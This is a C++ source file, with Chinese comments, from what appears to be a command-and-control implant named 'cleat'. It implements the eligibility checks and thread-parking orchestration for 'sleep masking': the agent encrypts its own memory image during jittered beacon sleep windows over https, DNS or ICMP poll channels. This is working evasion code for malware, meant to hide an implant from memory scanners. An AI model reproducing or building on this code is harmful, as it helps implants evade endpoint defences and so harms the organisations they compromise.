/**
 * @file MaskGate.cpp
 * @brief 掩码资格判定与窗口编排实现(仅 CLEAT_WITH_MASK=ON 编入)
 * @details
 * 判定四问的全局可观测项都收口在此: 线程名册(ThreadGovernor)、在飞命令
 * (CommandWorker)、QUIC 污染(MsQuicOps 进程级标记)、配置(AgentConfig mask 域)。
 * 通道 agency 与出站积压由调用方快照传入 —— 它们是 SessionLoop/OutboundSink 的
 * 所属状态, 掩码模块不反向持有。
 */
#include "Core/Mask/MaskGate.hpp"

#ifdef CLEAT_WITH_MASK

#include "Core/Mask/MaskPark.hpp"
#include "Core/Mask/MaskRuntime.hpp"
#include "Core/Config/AgentConfig.hpp"
#include "Core/Concurrency/ThreadGovernor.hpp"
#include "Core/Command/Queue/CommandWorker.hpp"
#include "Core/Comms/Transports/Quic/MsQuicOps.hpp"

#include <algorithm>
#include <random>

#include "Common/Logger/Logger.hpp"

namespace cleat {
namespace MaskGate {
namespace {

    /// 停靠 ack 收集上界(主循环节拍 100ms + 执行抖动, 放宽到
    /// 500ms —— 超时只意味着"本轮放弃", 从不降低安全性: 没收齐 ack 就不会进窗口)
    constexpr uint32_t kParkEnterTimeoutMs = 500;

    /// 窗长抖动 ±permille(每次窗口独立取样, 节奏不规则化)
    uint32_t JitterMs(uint32_t base, uint32_t permille) {
        if (permille == 0 || base == 0) {
            return base;
        }
        std::mt19937 rng(std::random_device{}());
        const int64_t delta = static_cast<int64_t>(base) * permille / 1000;
        const int64_t lo = std::max<int64_t>(1, static_cast<int64_t>(base) - delta);
        const int64_t hi = static_cast<int64_t>(base) + delta;
        return static_cast<uint32_t>(std::uniform_int_distribution<int64_t>(lo, hi)(rng));
    }

} // namespace

    bool SilenceOk(const SilenceParams& in, uint32_t inflightExempt, std::string& reason) {
        // DLL 线程通知污染(taint 族): DisableThreadLibraryCalls 失败的宿主里,
        // 窗口期系统线程生灭 = 执行镜像内密文入口。
        if (MaskPark::ThreadNotifyUnsafe()) {
            reason = "dll-notify-unsafe";
            return false;
        }
        // 名册: Service/Task/Ephemeral 任一在册即不掩。Infrastructure
        // (worker/reaper)与 Main 不阻断 —— 它们由停靠协议接管。
        for (const UnitSnapshot& unit : ThreadGovernor::List()) {
            if (unit.kind == JobKind::Service || unit.kind == JobKind::Task ||
                unit.kind == JobKind::Ephemeral) {
                reason = std::string("governor:") + unit.name;
                return false;
            }
        }
        // 在飞命令: 自测命令按豁免数放行自身(它发起窗口时自己必然在飞)
        if (CommandWorker::Instance().InFlightCount() > inflightExempt) {
            reason = "command-in-flight";
            return false;
        }
        // 出站未排空: 队列里有帧, 掩码期出站会执行密文
        if (in.outbound_queued_bytes != 0) {
            reason = "outbound-backlog";
            return false;
        }
        // 通道内待落线上行分片: sink 排空 ≠ 干完 —— DNS/ICMP 分片
        // 要多次 Recv 才逐片落线, 未排空就进窗 = 分片在窗口内冻结(干到一半睡觉)。
        // 仅稳态门填本值; dormant/退避不填(链路离线, 分片本就等重连)。
        if (in.channel_uplink_bytes != 0) {
            reason = "channel-uplink-pending";
            return false;
        }
        // QUIC 污染(零风险策略): MsQuicOpen2 执行过即永久禁用 ——
        // msquic 平台线程(逻辑核数条)start 地址静态链入本镜像, 普查虽能兜底,
        // 但"关闭后是否真退出"未实测, 双保险直接拒绝。
        if (QuicEverOpened()) {
            reason = "quic-tainted";
            return false;
        }
        return true;
    }

    bool Eligible(const SilenceParams& in, std::string& reason) {
        // ① 配置: 编译开关已在产物层裁剪, 这里是运行期开关(默认关; SetConfig 下发)
        if (!AgentConfig::Instance().GetMaskConfig().enabled) {
            reason = "disabled";
            return false;
        }
        // ② 通道: 仅 Poll 型(https/dns/icmp; Push 通道有专用接收线程, 一律现状路径)
        if (!in.channel_is_poll) {
            reason = "push-channel";
            return false;
        }
        return SilenceOk(in, 0, reason);
    }

    bool MaskedSleep(uint32_t requestMs, const SilenceParams& in, std::string& reason,
        uint32_t* actualMs) {
        if (!Eligible(in, reason)) {
            return false;
        }
        std::unique_ptr<IMaskRuntime> rt = CreateMaskRuntime();
        if (!rt || !rt->Supported()) {
            reason = "mask-unsupported";
            return false;
        }
        const MaskConfig cfg = AgentConfig::Instance().GetMaskConfig();
        uint32_t window = 0;
        if (requestMs != 0) {
            // 节奏合一: 请求方 = 节拍源(心跳到期/退避剩余, 自带抖动),
            // 配置仅作上限(cap); 不再叠加窗长抖动。
            window = (requestMs < cfg.sleep_ms) ? requestMs : cfg.sleep_ms;
        }
        else {
            // 固定窗路径(dormant / 查询不可得回退): 保持 ±jitter 采样。
            window = JitterMs(cfg.sleep_ms, cfg.jitter_permille);
        }

        // 停靠 → 窗口 → 放行。普查在 SelfTest 内部: 名单外镜像内线程
        // → 拒绝执行; SelfTest 返回 false 时镜像必然未被加密(失败集中在链构建期)。
        LOG_DEBUG("MaskGate: 掩码窗口尝试 窗长=" << window << "ms(停靠前)");
        MaskPark::Session park;
        if (!park.Enter(kParkEnterTimeoutMs)) {
            reason = "park-enter-timeout";
            LOG_DEBUG("MaskGate: park Enter 失败(诊断)");
            return false;
        }
        LOG_DEBUG("MaskGate: 全员停靠, 进窗口");
        MaskSelfTestReport rep;
        std::string err;
        if (!rt->SelfTest(true, window, MaskPark::RegisteredTids(), rep, err)) {
            reason = "window: " + err;
            return false;   // park RAII 已放行参与者
        }
        if (actualMs) {
            *actualMs = rep.windowMs;
        }
        return true;   // 窗口已过, 镜像已解密, 参与者已放行(~Session)
    }

    bool TestPrecheck(const SilenceParams& in, std::string& reason) {
        return SilenceOk(in, 1, reason);   // 自身豁免 1 条(本命令即在飞)
    }

} // namespace MaskGate
} // namespace cleat

#endif // CLEAT_WITH_MASK
